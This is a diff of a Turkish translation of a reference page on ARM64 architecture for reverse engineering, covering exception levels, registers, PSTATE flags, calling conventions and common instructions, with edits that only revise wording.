@@ -5,209 +5,209 @@
 
 ## **Exception Levels - EL (ARM64v8)**
 
-ARMv8 mimarisinde Exception Levels (EL) olarak adlandırılan execution level'lar, execution environment'ın privilege level'ını ve yeteneklerini tanımlar. EL0'dan EL3'e kadar dört exception level bulunur ve her biri farklı bir amaca hizmet eder:
+ARMv8 mimarisinde Exception Levels (EL) olarak bilinen execution seviyeleri, execution environment'ın privilege seviyesini ve yeteneklerini tanımlar. EL0'dan EL3'e kadar dört exception seviyesi vardır ve her biri farklı bir amaca hizmet eder:
 
 1. **EL0 - User Mode**:
-- En düşük privilege level'dır ve normal application code'u çalıştırmak için kullanılır.
-- EL0'da çalışan uygulamalar birbirlerinden ve system software'dan izole edilir; bu da security ve stability'yi artırır.
+- En düşük privilege seviyesidir ve normal application code çalıştırmak için kullanılır.
+- EL0'da çalışan application'lar birbirlerinden ve system software'dan izole edilir; bu da security ve stability'yi artırır.
 2. **EL1 - Operating System Kernel Mode**:
-- Çoğu operating system kernel'ı bu level'da çalışır.
+- Çoğu operating system kernel'ı bu seviyede çalışır.
 - EL1, EL0'dan daha fazla privilege'a sahiptir ve system resource'larına erişebilir; ancak system integrity'yi korumak için bazı kısıtlamalar bulunur. EL0'dan EL1'e `SVC` instruction'ı ile geçilir.
 3. **EL2 - Hypervisor Mode**:
-- Bu level virtualization için kullanılır. EL2'de çalışan bir hypervisor, aynı physical hardware üzerinde çalışan birden fazla operating system'ı (her biri kendi EL1'inde) yönetebilir.
-- EL2, virtualized environment'ların isolation ve control'ü için özellikler sağlar.
-- Bu nedenle Parallels gibi virtual machine application'ları, kernel extension'a ihtiyaç duymadan EL2 ile etkileşim kurmak ve virtual machine çalıştırmak için `hypervisor.framework` kullanabilir.
+- Bu seviye virtualization için kullanılır. EL2'de çalışan bir hypervisor, aynı physical hardware üzerinde çalışan birden fazla operating system'ı (her biri kendi EL1 seviyesinde) yönetebilir.
+- EL2, virtualized environment'ların izolasyonu ve kontrolü için özellikler sağlar.
+- Bu nedenle Parallels gibi virtual machine application'ları, kernel extension'larına ihtiyaç duymadan EL2 ile etkileşim kurmak ve virtual machine çalıştırmak için `hypervisor.framework` kullanabilir.
 - EL1'den EL2'ye geçmek için `HVC` instruction'ı kullanılır.
 4. **EL3 - Secure Monitor Mode**:
-- En yüksek privilege level'dır ve çoğunlukla secure booting ile trusted execution environment'lar için kullanılır.
-- EL3, secure ve non-secure state'ler arasındaki access'leri (secure boot, trusted OS vb.) yönetebilir ve kontrol edebilir.
+- En yüksek privilege seviyesidir ve genellikle secure booting ile trusted execution environment'lar için kullanılır.
+- EL3, secure ve non-secure state'ler arasındaki erişimleri yönetebilir ve kontrol edebilir (secure boot, trusted OS vb.).
 - macOS'ta KPP (Kernel Patch Protection) için kullanılıyordu, ancak artık kullanılmıyor.
 - EL3 artık Apple tarafından kullanılmıyor.
 - EL3'e geçiş genellikle `SMC` (Secure Monitor Call) instruction'ı kullanılarak gerçekleştirilir.
 
-Bu level'ların kullanılması, user application'lardan en yüksek privilege'a sahip system software'a kadar system'in farklı yönlerini yönetmek için structured ve secure bir yöntem sağlar. ARMv8'in privilege level yaklaşımı, farklı system component'lerini etkili biçimde izole ederek system'in security ve robustness'ını artırır.
+Bu seviyelerin kullanılması, user application'larından en yüksek privilege'a sahip system software'a kadar system'in farklı bölümlerini yönetmek için yapılandırılmış ve güvenli bir yöntem sağlar. ARMv8'in privilege seviyelerine yaklaşımı, farklı system component'larını etkili biçimde izole ederek system'in security ve robustness özelliklerini artırır.
 
 ## **Registers (ARM64v8)**
 
-ARM64'te `x0` ile `x30` arasında etiketlenmiş **31 general-purpose register** bulunur. Her biri **64-bit** (8-byte) değer saklayabilir. Yalnızca 32-bit değer gerektiren operation'lar için aynı register'lara w0 ile w30 adları kullanılarak 32-bit mode'da erişilebilir.
+ARM64'te `x0` ile `x30` arasında adlandırılmış **31 general-purpose register** bulunur. Her biri **64-bit** (8-byte) değer saklayabilir. Yalnızca 32-bit değer gerektiren operation'lar için aynı register'lara w0 ile w30 adları kullanılarak 32-bit mode'da erişilebilir.
 
-1. **`x0`** ile **`x7`** arası - Bunlar genellikle scratch register olarak ve subroutine'lere parameter geçirmek için kullanılır.
-- **`x0`** ayrıca bir function'ın return data'sını taşır.
+1. **`x0`** ile **`x7`** - Bunlar genellikle scratch register olarak ve subroutine'lere parameter geçirmek için kullanılır.
+- **`x0`** ayrıca bir function'ın return data'sını taşır
 2. **`x8`** - Linux kernel'da `x8`, `svc` instruction'ı için system call number olarak kullanılır. **macOS'ta kullanılan register x16'dır!**
-3. **`x9`** ile **`x15`** arası - Daha fazla temporary register; çoğunlukla local variable'lar için kullanılır.
-4. **`x16`** ve **`x17`** - **Intra-procedural Call Register**'larıdır. Immediate value'lar için temporary register'lardır. Ayrıca indirect function call'larında ve PLT (Procedure Linkage Table) stub'larında kullanılırlar.
-- **macOS'ta `x16`**, **`svc`** instruction'ı için **system call number** olarak kullanılır.
-5. **`x18`** - **Platform register**. General-purpose register olarak kullanılabilir; ancak bazı platformlarda platform-specific kullanım için ayrılmıştır: Windows'ta current thread environment block'a pointer olarak veya **Linux kernel'da o anda çalışan task structure'ını göstermek için** kullanılır.
-6. **`x19`** ile **`x28`** arası - Bunlar callee-saved register'lardır. Bir function, caller'ı için bu register'ların değerlerini korumalıdır; bu nedenle stack'te saklanır ve caller'a dönmeden önce geri yüklenir.
-7. **`x29`** - Stack frame'i takip etmek için kullanılan **frame pointer**'dır. Bir function çağrıldığı için yeni bir stack frame oluşturulduğunda **`x29` register'ı stack'te saklanır** ve **yeni** frame pointer address'i (**`sp` address'i**) bu register'a **saklanır**.
-- Bu register bir **general-purpose register** olarak da kullanılabilir; ancak genellikle **local variable**'lara referans olarak kullanılır.
-8. **`x30`** veya **`lr`** - **Link register**. Bir `BL` (Branch with Link) veya `BLR` (Branch with Link to Register) instruction'ı çalıştırıldığında **`pc` değerini bu register'a saklayarak** return address'i tutar.
+3. **`x9`** ile **`x15`** - Daha fazla temporary register; çoğunlukla local variable'lar için kullanılır.
+4. **`x16`** ve **`x17`** - **Intra-procedural Call Registers**. Immediate value'lar için temporary register'lardır. Ayrıca indirect function call'ları ve PLT (Procedure Linkage Table) stub'larını için kullanılırlar.
+- **`x16`**, macOS'ta **`svc`** instruction'ı için **system call number** olarak kullanılır.
+5. **`x18`** - **Platform register**. General-purpose register olarak kullanılabilir; ancak bazı platformlarda platforma özel kullanımlar için ayrılmıştır: Windows'ta current thread environment block'a pointer veya **Linux kernel'da o anda çalışan task structure'ını göstermek** için kullanılır.
+6. **`x19`** ile **`x28`** - Bunlar callee-saved register'lardır. Bir function, caller'ı için bu register'ların değerlerini korumalıdır; bu nedenle değerler stack'te saklanır ve caller'a dönmeden önce geri yüklenir.
+7. **`x29`** - Stack frame'i takip etmek için kullanılan **frame pointer**'dır. Bir function çağrıldığı için yeni bir stack frame oluşturulduğunda **`x29` register'ı stack'te saklanır** ve **yeni** frame pointer address'i (**`sp`** address'i) bu register'a **saklanır**.
+- Bu register aynı zamanda **general-purpose register** olarak kullanılabilir; ancak genellikle **local variable**'lara referans olarak kullanılır.
+8. **`x30`** veya **`lr`** - **Link register**. Bir `BL` (Branch with Link) veya `BLR` (Branch with Link to Register) instruction'ı çalıştırıldığında **`pc`** değerini bu register'a kaydederek **return address**'i tutar.
 - Diğer register'lar gibi kullanılabilir.
-- Current function yeni bir function çağıracaksa ve dolayısıyla `lr`'ı overwrite edecekse, başlangıçta onu stack'e kaydeder; bu epilogue'dur (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> `fp` ve `lr`'ı sakla, yer ayır ve yeni `fp`'yi al) ve sonunda geri yükler; bu da prologue'dur (`ldp x29, x30, [sp], #48; ret` -> `fp` ve `lr`'ı geri yükle ve return et).
-9. **`sp`** - Stack'in üstünü takip etmek için kullanılan **stack pointer**.
-- **`sp`** değeri her zaman en az bir **quadword**'a hizalı (**alignment**) tutulmalıdır; aksi halde alignment exception meydana gelebilir.
-10. **`pc`** - Sonraki instruction'ı gösteren **program counter**. Bu register yalnızca exception generation'ları, exception return'leri ve branch'ler aracılığıyla güncellenebilir. Bu register'ı okuyabilen tek ordinary instruction'lar, **`pc` address'ini `lr`'a (Link Register) saklamak için** kullanılan branch with link instruction'larıdır (BL, BLR).
-11. **`xzr`** - **Zero register**. 32-bit register formunda **`wzr`** olarak da adlandırılır. Zero değerini kolayca elde etmek (yaygın bir operation) veya **`subs`** kullanarak karşılaştırma yapmak için kullanılabilir; örneğin **`subs XZR, Xn, #10`**, sonuç verisini hiçbir yere saklamaz (**`xzr`** içine).
+- Current function yeni bir function çağıracaksa ve bu nedenle `lr`'ı overwrite edecekse, başlangıçta onu stack'e kaydeder; bu epilogue'dur (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> `fp` ve `lr`'ı sakla, alan oluştur ve yeni `fp`'yi al) ve sonunda geri yükler; bu da prologue'dur (`ldp x29, x30, [sp], #48; ret` -> `fp` ve `lr`'ı geri yükle ve return et).
+9. **`sp`** - Stack'in tepesini takip etmek için kullanılan **stack pointer**.
+- **`sp`** değeri her zaman en az **quadword** **alignment**'ı korunacak şekilde tutulmalıdır; aksi halde bir alignment exception oluşabilir.
+10. **`pc`** - Bir sonraki instruction'ı gösteren **program counter**. Bu register yalnızca exception generation'ları, exception return'leri ve branch'ler aracılığıyla güncellenebilir. Bu register'ı okuyabilen tek ordinary instruction'lar, **`pc`** address'ini **`lr`**'a (Link Register) kaydetmek için kullanılan branch with link instruction'larıdır (BL, BLR).
+11. **`xzr`** - **Zero register**. 32-bit register formunda **`wzr`** olarak da adlandırılır. Sıfır değerini kolayca elde etmek (yaygın bir operation) veya **`subs`** kullanarak comparison gerçekleştirmek için kullanılabilir; örneğin **`subs XZR, Xn, #10`**, elde edilen data'yı hiçbir yere saklamaz (**`xzr`** içine).
 
 **`Wn`** register'ları, **`Xn`** register'larının **32-bit** sürümüdür.
 
 > [!TIP]
-> X0 - X18 arasındaki register'lar volatile'dır; bu, değerlerinin function call'ları ve interrupt'lar tarafından değiştirilebileceği anlamına gelir. Buna karşılık X19 - X28 arasındaki register'lar non-volatile'dır; yani function call'ları arasında korunmaları gerekir ("callee saved").
+> X0 - X18 arasındaki register'lar volatile'dır; bu, değerlerinin function call'ları ve interrupt'lar tarafından değiştirilebileceği anlamına gelir. Buna karşılık X19 - X28 arasındaki register'lar non-volatile'dır; yani değerleri function call'ları boyunca korunmalıdır ("callee saved").
 
-### SIMD and Floating-Point Registers
+### SIMD ve Floating-Point Registers
 
-Ayrıca optimized single instruction multiple data (SIMD) operation'larında ve floating-point arithmetic gerçekleştirmek için kullanılabilen **128-bit uzunluğunda 32 register** daha vardır. Bunlara Vn register'ları denir; ancak **64**-bit, **32**-bit, **16**-bit ve **8**-bit olarak da çalışabilirler ve bu durumda sırasıyla **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** ve **`Bn`** olarak adlandırılırlar.
+Bunlara ek olarak, optimized single instruction multiple data (SIMD) operation'larında ve floating-point arithmetic gerçekleştirmede kullanılabilen **128-bit uzunluğunda 32 register** daha vardır. Bunlara Vn register'ları denir; ancak bu register'lar **64**-bit, **32**-bit, **16**-bit ve **8**-bit olarak da çalışabilir ve bu durumda **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** ve **`Bn`** olarak adlandırılırlar.
 
 ### System Registers
 
-**Yüzlerce system register bulunur**; special-purpose register (SPR) olarak da adlandırılan bu register'lar **processor** davranışını **izlemek** ve **kontrol etmek** için kullanılır.\
-Yalnızca özel instruction'lar olan **`mrs`** ve **`msr`** kullanılarak okunabilir veya ayarlanabilirler.
+**Yüzlerce system register** bulunur; special-purpose register (SPR) olarak da adlandırılan bu register'lar **processor** davranışını **izlemek** ve **kontrol etmek** için kullanılır.\
+Yalnızca dedicated special instruction olan **`mrs`** ve **`msr`** kullanılarak okunabilir veya ayarlanabilirler.
 
-**`TPIDR_EL0`** ve **`TPIDDR_EL0`** special register'larına reverse engineering sırasında sıkça rastlanır. `EL0` suffix'i, register'a erişilebilen **minimum exception level'ı** belirtir (bu durumda EL0, normal programların çalıştığı regular exception (privilege) level'dır).\
-Bunlar genellikle thread-local storage memory region'ının **base address'ini** saklamak için kullanılır. Genellikle ilki EL0'da çalışan programlar tarafından okunabilir ve yazılabilir; ikincisi ise EL0'dan okunabilir ve EL1'den (kernel gibi) yazılabilir.
+**`TPIDR_EL0`** ve **`TPIDDR_EL0`** special register'larına reverse engineering sırasında sıkça rastlanır. `EL0` suffix'i, register'a erişilebilen **minimum exception** seviyesini gösterir (bu durumda EL0, regular program'ların çalıştığı regular exception (privilege) seviyesidir).\
+Bu register'lar çoğunlukla thread-local storage memory region'ının **base address**'ini saklamak için kullanılır. Genellikle ilki EL0'da çalışan programlar tarafından okunabilir ve yazılabilir; ikincisi ise EL0'dan okunabilir ve EL1'den (kernel gibi) yazılabilir.
 
-- `mrs x0, TPIDR_EL0 ; TPIDR_EL0'ı x0'a oku`
-- `msr TPIDR_EL0, X0 ; x0'ı TPIDR_EL0'a yaz`
+- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
+- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`
 
 ### **PSTATE**
 
-**PSTATE**, çeşitli process component'lerini, operating system tarafından görülebilen **`SPSR_ELx`** special register'ı içinde serialize edilmiş halde barındırır; X, **tetiklenen** exception'ın **permission** **level'ıdır** (bu, exception sona erdiğinde process state'in geri yüklenmesini sağlar).\
-Erişilebilir field'lar şunlardır:
+**PSTATE**, çeşitli process component'larını operating-system-visible **`SPSR_ELx`** special register'ında serialize edilmiş biçimde içerir; buradaki X, tetiklenen exception'ın **permission** **level**'ını belirtir (bu, exception sona erdiğinde process state'in geri yüklenmesini sağlar).\
+Erişilebilen field'lar şunlardır:
 
 <figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>
 
 - **`N`**, **`Z`**, **`C`** ve **`V`** condition flag'leri:
-- **`N`**, operation'ın negatif bir sonuç ürettiği anlamına gelir.
-- **`Z`**, operation'ın sıfır ürettiği anlamına gelir.
-- **`C`**, operation'ın carry oluşturduğu anlamına gelir.
-- **`V`**, operation'ın signed overflow oluşturduğu anlamına gelir:
+- **`N`**, operation'ın negatif bir sonuç ürettiği anlamına gelir
+- **`Z`**, operation'ın sıfır ürettiği anlamına gelir
+- **`C`**, operation'ın carry ürettiği anlamına gelir
+- **`V`**, operation'ın signed overflow ürettiği anlamına gelir:
 - İki pozitif sayının toplamı negatif bir sonuç üretir.
 - İki negatif sayının toplamı pozitif bir sonuç üretir.
-- Subtraction işleminde, büyük bir negatif sayı daha küçük bir pozitif sayıdan (veya tersi) çıkarıldığında ve sonuç verilen bit boyutunun aralığında temsil edilemediğinde.
+- Subtraction işleminde, büyük bir negatif sayı daha küçük bir pozitif sayıdan (veya tersi) çıkarıldığında ve sonuç verilen bit size aralığında temsil edilemediğinde.
 - Processor operation'ın signed veya unsigned olduğunu kendiliğinden bilmez; bu nedenle operation'larda C ve V'yi kontrol eder ve signed veya unsigned olması durumunda carry oluşup oluşmadığını belirtir.
 
 > [!WARNING]
-> Tüm instruction'lar bu flag'leri güncellemez. **`CMP`** veya **`TST`** gibi bazıları günceller; `s` suffix'ine sahip **`ADDS`** gibi diğerleri de günceller.
+> Tüm instruction'lar bu flag'leri güncellemez. **`CMP`** veya **`TST`** gibi bazıları günceller; `s` suffix'ine sahip **`ADDS`** gibi diğerleri de bunu yapar.
 
-- Current **register width (`nRW`) flag'i**: Flag 0 değerini taşıyorsa program resume edildiğinde AArch64 execution state'inde çalışır.
-- Current **Exception Level** (**`EL`**): EL0'da çalışan regular bir programın değeri 0 olur.
-- **Single stepping** flag'i (**`SS`**): Debugger'lar tarafından, exception aracılığıyla **`SPSR_ELx`** içindeki SS flag'i 1'e ayarlanarak single step yapmak için kullanılır. Program bir step çalıştırır ve single step exception oluşturur.
-- **Illegal exception** state flag'i (**`IL`**): Privileged software geçersiz bir exception level transferi gerçekleştirdiğinde bunu işaretlemek için kullanılır; bu flag 1'e ayarlanır ve processor illegal state exception tetikler.
-- **`DAIF`** flag'leri: Bu flag'ler privileged bir programın belirli external exception'ları seçici biçimde mask'lemesini sağlar.
-- **`A`** değeri 1 ise **asynchronous abort**'ların tetikleneceği anlamına gelir. **`I`**, external hardware **Interrupt Request**'lerine (IRQ) yanıt verilmesini yapılandırır; F ise **Fast Interrupt Request**'lerle (FIR) ilgilidir.
-- **Stack pointer select** flag'leri (**`SPS`**): EL1 ve üzerindeki seviyelerde çalışan privileged programlar, kendi stack pointer register'larını kullanmak ile user-model stack pointer'ı kullanmak arasında geçiş yapabilir (örneğin `SP_EL1` ile `EL0` arasında). Bu geçiş, **`SPSel`** special register'ına yazılarak gerçekleştirilir. Bu işlem EL0'dan yapılamaz.
+- Current **register width (`nRW`) flag'i**: Flag 0 değerini taşıyorsa program, resume edildiğinde AArch64 execution state'inde çalışır.
+- Current **Exception Level** (**`EL`**): EL0'da çalışan regular bir program 0 değerine sahip olur
+- **Single stepping** flag'i (**`SS`**): Debugger'lar tarafından single step gerçekleştirmek için kullanılır; bir exception aracılığıyla **`SPSR_ELx`** içindeki SS flag'i 1 olarak ayarlanır. Program bir step çalıştırır ve single step exception üretir.
+- **Illegal exception** state flag'i (**`IL`**): Privileged software geçersiz bir exception level transferi gerçekleştirdiğinde bunu işaretlemek için kullanılır; bu flag 1 olarak ayarlanır ve processor illegal state exception tetikler.
+- **`DAIF`** flag'leri: Bu flag'ler, privileged bir programın belirli external exception'ları seçerek mask'lemesini sağlar.
+- **`A`** 1 ise **asynchronous abort**'ların tetikleneceği anlamına gelir. **`I`**, external hardware **Interrupt Request**'lerine (IRQ) yanıt verilmesini yapılandırır. F ise **Fast Interrupt Request**'lerle (FIR) ilgilidir.
+- **Stack pointer select** flag'leri (**`SPS`**): EL1 ve üzeri seviyelerde çalışan privileged program'lar, kendi stack pointer register'larını kullanmak ile user-model register'ını kullanmak arasında geçiş yapabilir (ör. `SP_EL1` ile `EL0` arasında). Bu switching, **`SPSel`** special register'ına yazılarak gerçekleştirilir. Bu işlem EL0'dan yapılamaz.
 
 ## **Calling Convention (ARM64v8)**
 
-ARM64 calling convention'ına göre bir function'ın **ilk sekiz parameter'ı** **`x0`** ile **`x7`** arasındaki register'larda geçirilir. **Ek** parameter'lar **stack** üzerinde geçirilir. **Return** değeri **`x0`** register'ında; **128 bit uzunluğundaysa** ayrıca **`x1`** register'ında döndürülür. **`x19`** ile **`x30`** arasındaki register'lar ve **`sp`** register'ı function call'ları boyunca **korunmalıdır**.
+ARM64 calling convention'ı, bir function'ın **ilk sekiz parameter'ının** **`x0`** ile **`x7`** arasındaki register'larda geçirilmesini belirtir. **Ek** parameter'lar **stack** üzerinde geçirilir. **Return** değeri **`x0`** register'ında; değer **128 bit uzunluğundaysa** ayrıca **`x1`** register'ında geçirilir. **`x19`** ile **`x30`** arasındaki register'lar ve **`sp`** register'ı function call'ları boyunca **korunmalıdır**.
 
-Assembly'de bir function okurken **function prologue ve epilogue**'unu arayın. **Prologue** genellikle **frame pointer'ı (`x29`) kaydetmeyi**, **yeni bir frame pointer ayarlamayı** ve **stack alanı ayırmayı** içerir. **Epilogue** ise genellikle kaydedilmiş frame pointer'ı **geri yüklemeyi** ve function'dan **return etmeyi** içerir.
+Assembly'de bir function okurken **function prologue** ve **epilogue**'u arayın. **Prologue** genellikle **frame pointer'ı (`x29`) kaydetmeyi**, **yeni bir frame pointer ayarlamayı** ve **stack alanı ayırmayı** içerir. **Epilogue** ise genellikle kaydedilmiş frame pointer'ın **geri yüklenmesini** ve function'dan **return edilmesini** içerir.
 
-### Calling Convention in Swift
+### Swift'te Calling Convention
 
-Swift'in kendi **calling convention**'ı vardır; bu convention [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64) adresinde bulunabilir.
+Swift'in, [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64) adresinde bulunabilen kendine ait bir **calling convention**'ı vardır.
 
 ## **Common Instructions (ARM64v8)**
 
-ARM64 instruction'ları genel olarak **`opcode dst, src1, src2`** formatına sahiptir. Burada **`opcode`** gerçekleştirilecek operation'ı (`add`, `sub`, `mov` vb.), **`dst`** sonucun saklanacağı **destination** register'ı, **`src1`** ve **`src2`** ise **source** register'larını belirtir. Source register'lar yerine immediate value'lar da kullanılabilir.
+ARM64 instruction'ları genel olarak **`opcode dst, src1, src2`** formatına sahiptir; burada **`opcode`**, gerçekleştirilecek operation'ı (`add`, `sub`, `mov` vb.), **`dst`** sonucun saklanacağı **destination** register'ını, **`src1`** ve **`src2`** ise **source** register'larını belirtir. Source register'ları yerine immediate value'lar da kullanılabilir.
 
 - **`mov`**: Bir register'daki değeri başka bir register'a **taşır**.
-- Örnek: `mov x0, x1` — `x1`'deki değeri `x0`'a taşır.
-- **`ldr`**: Bir değeri **memory'den** bir **register'a yükler**.
+- Örnek: `mov x0, x1` — `x1` içindeki değeri `x0`'a taşır.
+- **`ldr`**: Bir değeri **memory**'den **register**'a **yükler**.
 - Örnek: `ldr x0, [x1]` — `x1` tarafından gösterilen memory location'daki değeri `x0`'a yükler.
 - **Offset mode**: Origin pointer'ı etkileyen bir offset şu şekilde belirtilir:
-- `ldr x2, [x1, #8]`, x1 + 8 değerini x2'ye yükler.
-- `ldr x2, [x0, x1, lsl #2]`, x0 array'inden x1 (index) \* 4 konumundaki object'i x2'ye yükler.
-- **Pre-indexed mode**: Calculation'ları origin'e uygular, sonucu alır ve yeni origin'i origin içinde saklar.
-- `ldr x2, [x1, #8]!`, x1 + 8 değerini x2'ye yükler ve x1'e x1 + 8 sonucunu yazar.
-- `str lr, [sp, #-4]!`, link register'ı sp'de saklar ve sp register'ını günceller.
-- **Post-index mode**: Önceki mode'a benzer; ancak memory address'ine erişilir, ardından offset hesaplanıp saklanır.
-- `ldr x0, [x1], #8`, x1'i x0'a yükler ve x1'i x1 + 8 ile günceller.
-- **PC-relative addressing**: Bu durumda yüklenecek address, PC register'ına göre hesaplanır.
-- `ldr x1, =_start`, `_start` symbol'ünün başladığı address'i current PC'ye göre x1'e yükler.
-- **`str`**: Bir register'daki değeri **memory'ye kaydeder**.
-- Örnek: `str x0, [x1]` — `x0` değerini, `x1` tarafından gösterilen memory location'a kaydeder.
-- **`ldp`**: **Load Pair of Registers**. Bu instruction, **consecutive memory** location'larından iki register yükler. Memory address'i genellikle başka bir register'daki değere offset eklenerek oluşturulur.
+- `ldr x2, [x1, #8]`, bu instruction x1 + 8'deki değeri x2'ye yükler
+- `ldr x2, [x0, x1, lsl #2]`, bu instruction x0 array'inden x1 (index) \* 4 konumundaki bir object'i x2'ye yükler
+- **Pre-indexed mode**: Calculation'ları origin'e uygular, sonucu alır ve yeni origin'i origin'e kaydeder.
+- `ldr x2, [x1, #8]!`, bu instruction `x1 + 8` değerini `x2`'ye yükler ve `x1` içine `x1 + 8` sonucunu kaydeder
+- `str lr, [sp, #-4]!`, link register'ı sp'ye kaydeder ve sp register'ını günceller
+- **Post-index mode**: Önceki mode'a benzer; ancak memory address'e erişilir, ardından offset hesaplanır ve kaydedilir.
+- `ldr x0, [x1], #8`, x1'i x0'a yükler ve x1'i `x1 + 8` ile günceller
+- **PC-relative addressing**: Bu durumda yüklenecek address, PC register'ına göre relative olarak hesaplanır
+- `ldr x1, =_start`, `_start` symbol'ının başladığı address'i current PC'ye göre x1'e yükler.
+- **`str`**: Bir register'daki değeri **memory**'ye **kaydeder**.
+- Örnek: `str x0, [x1]` — `x0` içindeki değeri `x1` tarafından gösterilen memory location'a kaydeder.
+- **`ldp`**: **Load Pair of Registers**. Bu instruction, **consecutive memory** location'larından **iki register** yükler. Memory address genellikle başka bir register'daki değere offset eklenerek oluşturulur.
 - Örnek: `ldp x0, x1, [x2]` — `x0` ve `x1`'i sırasıyla `x2` ve `x2 + 8` memory location'larından yükler.
-- **`stp`**: **Store Pair of Registers**. Bu instruction, iki register'ı **consecutive memory** location'larına kaydeder. Memory address'i genellikle başka bir register'daki değere offset eklenerek oluşturulur.
+- **`stp`**: **Store Pair of Registers**. Bu instruction, **iki register'ı** **consecutive memory** location'larına kaydeder. Memory address genellikle başka bir register'daki değere offset eklenerek oluşturulur.
 - Örnek: `stp x0, x1, [sp]` — `x0` ve `x1`'i sırasıyla `sp` ve `sp + 8` memory location'larına kaydeder.
 - `stp x0, x1, [sp, #16]!` — `x0` ve `x1`'i sırasıyla `sp+16` ve `sp + 24` memory location'larına kaydeder ve `sp`'yi `sp+16` ile günceller.
-- **`add`**: İki register'ın değerini toplar ve sonucu bir register'a kaydeder.
+- **`add`**: İki register'ın değerlerini **toplar** ve sonucu bir register'a kaydeder.
 - Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
 - Xn1 -> Destination
 - Xn2 -> Operand 1
 - Xn3 | #imm -> Operand 2 (register veya immediate)
-- \[shift #N | RRX] -> Bir shift gerçekleştir veya RRX çağır.
-- Örnek: `add x0, x1, x2` — `x1` ve `x2` değerlerini toplar ve sonucu x0'a kaydeder.
-- `add x5, x5, #1, lsl #12` — Bu, 4096'ya eşittir (1'i 12 kez shift etmek) -> 1 0000 0000 0000 0000
-- **`adds`** bir `add` gerçekleştirir ve flag'leri günceller.
-- **`sub`**: İki register'ın değerini çıkarır ve sonucu bir register'a kaydeder.
-- **`add` syntax'ına** bakın.
-- Örnek: `sub x0, x1, x2` — x2 değerini x1'den çıkarır ve sonucu x0'a kaydeder.
-- **`subs`**, `sub` gibidir ancak flag'i günceller.
-- **`mul`**: **İki register'ın** değerini çarpar ve sonucu bir register'a kaydeder.
-- Örnek: `mul x0, x1, x2` — x1 ve x2 değerlerini çarpar ve sonucu x0'a kaydeder.
-- **`div`**: Bir register'ın değerini başka bir register'a böler ve sonucu bir register'a kaydeder.
-- Örnek: `div x0, x1, x2` — x1 değerini x2'ye böler ve sonucu x0'a kaydeder.
-- **`lsl`**, **`lsr`**, **`asr`**, **`ror`**, **`rrx`**:
-- **Logical shift left**: Sondan 0'lar ekleyerek diğer bitleri ileri taşır (n kez 2 ile çarpar).
-- **Logical shift right**: Başlangıca 1'ler ekleyerek diğer bitleri geriye taşır (unsigned durumda n kez 2'ye böler).
-- **Arithmetic shift right**: **`lsr`** gibidir; ancak en anlamlı bit 1 ise 0 eklemek yerine **1'ler eklenir** (signed durumda n kez 2'ye böler).
-- **Rotate right**: **`lsr`** gibidir; ancak sağdan çıkarılan her şey sola eklenir.
-- **Rotate Right with Extend**: **`ror`** gibidir; ancak carry flag "en anlamlı bit" olarak kullanılır. Carry flag bit 31'e, çıkarılan bit ise carry flag'e taşınır.
-- **`bfm`**: **Bit Field Move**; bu operation'lar bir değerden **`0...n` bit'lerini kopyalar** ve bunları **`m..m+n`** konumlarına yerleştirir. **`#s`**, **en soldaki bit** konumunu; **`#r`** ise **rotate right miktarını** belirtir.
+- \[shift #N | RRX] -> Bir shift gerçekleştir veya RRX çağır
+- Örnek: `add x0, x1, x2` — `x1` ve `x2` değerlerini toplar ve sonucu `x0`'a kaydeder.
+- `add x5, x5, #1, lsl #12` — Bu, 4096'ya eşittir (1'in 12 kez shift edilmesi) -> 1 0000 0000 0000 0000
+- **`adds`** Bir `add` gerçekleştirir ve flag'leri günceller
+- **`sub`**: İki register'ın değerlerini **çıkarır** ve sonucu bir register'a kaydeder.
+- **`add`** **syntax**'ına bakın.
+- Örnek: `sub x0, x1, x2` — `x2` değerini `x1`'den çıkarır ve sonucu `x0`'a kaydeder.
+- **`subs`** `sub` gibidir, ancak flag'i günceller
+- **`mul`**: **İki register'ın** değerlerini **çarpar** ve sonucu bir register'a kaydeder.
+- Örnek: `mul x0, x1, x2` — `x1` ve `x2` değerlerini çarpar ve sonucu `x0`'a kaydeder.
+- **`div`**: Bir register'ın değerini diğeriyle **böler** ve sonucu bir register'a kaydeder.
+- Örnek: `div x0, x1, x2` — `x1` değerini `x2`'ye böler ve sonucu `x0`'a kaydeder.
+- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
+- **Logical shift left**: Sondan 0'lar ekleyerek diğer bitleri ileri taşır (n kez 2 ile çarpma)
+- **Logical shift right**: Başlangıca 1'ler ekleyerek diğer bitleri geri taşır (unsigned durumda n kez 2'ye bölme)
+- **Arithmetic shift right**: **`lsr`** gibidir; ancak en anlamlı bit 1 ise 0 eklemek yerine **1'ler eklenir** (signed durumda n kez 2'ye bölme)
+- **Rotate right**: **`lsr`** gibidir; ancak sağdan çıkarılan bitler sola eklenir
+- **Rotate Right with Extend**: **`ror`** gibidir, ancak carry flag "en anlamlı bit" olarak kullanılır. Böylece carry flag bit 31'e, çıkarılan bit ise carry flag'e taşınır.
+- **`bfm`**: **Bit Field Move**; bu operation'lar bir değerdeki **`0...n` bit'lerini kopyalar** ve **`m..m+n`** konumlarına yerleştirir. **`#s`**, **en soldaki bit** konumunu; **`#r`** ise **rotate right miktarını** belirtir.
 - Bitfield move: `BFM Xd, Xn, #r`
 - Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
 - Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
-- **Bitfield Extract and Insert:** Bir register'dan bitfield kopyalar ve başka bir register'a yerleştirir.
-- **`BFI X1, X2, #3, #4`** X2'den 4 bit'i alır ve X1'in 3. bitinden itibaren yerleştirir.
-- **`BFXIL X1, X2, #3, #4`** X2'nin 3. bitinden dört bit çıkarır ve bunları X1'e kopyalar.
